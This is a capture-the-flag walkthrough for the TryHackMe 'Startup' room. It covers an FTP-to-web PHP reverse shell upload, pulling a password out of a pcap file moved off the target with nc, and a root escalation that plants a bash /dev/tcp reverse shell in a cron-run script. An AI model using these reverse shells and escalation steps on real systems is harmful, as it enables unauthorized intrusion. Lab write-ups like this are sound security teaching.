# Startup

[Startup](https://tryhackme.com/room/startup)

## Solution

- nmap scan 21, 22, 80

### Part 1 - Getting in

We can access the ftp files also from `<ip>/files`. This means that we can add
a file to ftp and then access it from the browser. I created a file
`exploit.php` with PHP PentestMonkey payload using https://www.revshells.com/.
Upload the file using ftp and then access it from the browser. While having nc
listen on the specified port. The answer for the first question is in `recipe.txt`

`FTP and HTTP. What could possibly go wrong?` - Be careful when using both.
Don't allow people to upload stuff to ftp and then access it from http.

### Part 2 - lennie

I ran `ls -lah` and seen an interesting directory that we have access,
`incidents`. It contains a pcapng file. We can use wireshark to analyze it.

To transfer the file (I did not know how to do it so for the rest of the noobs):
On the target machine run nc to listen on some port and read the file:

`nc -l -p 6969 < suspicious.pcapng`

On the host machine

`nc <ip> 6969 > suspicious.pcapng`

This should transfer the file. After the file is transfered you can kill the
host `nc` with Ctrl+C.

Analyzing in Wireshark.

Look at the conversations. An interesting one is 192.169.33.1, this guy
accessed /files/ftp/shell.php, so a revshell most probably, since the server
responded with 200.

The next one that jumped to me is the one to localhost:4444, since there are a
lot of requests, and usually 4444 is used by nc listener. If we inspect that
conversations (follow tcp stream) we can see the literal commands ran by the
hackerman.

Maybe useful information:
- some password attempt `c4ntg3t3n0ughsp1c3`

If we try to ssh into `lennie` with that password, we get access...

### Part 3 - root

In the home directory we have a `scritps` folder. Inside there is a
`planner.sh` script. It writes to a txt file the LIST env var. Then the script
calls another script `/etc/print.sh` that is owned by lennie.

Checking `cat /etc/crontab` there is no cronjob on scripts, however, the
timestamp of the `startup_list.txt` file keeps changing.

So the plan is to write in the print script a reverse shell.

```
#!/bin/bash
/bin/sh -i >& /dev/tcp/<host>/6969 0>&1
```

And on the host run `nc -lvnp 6969`. Finally we are root.
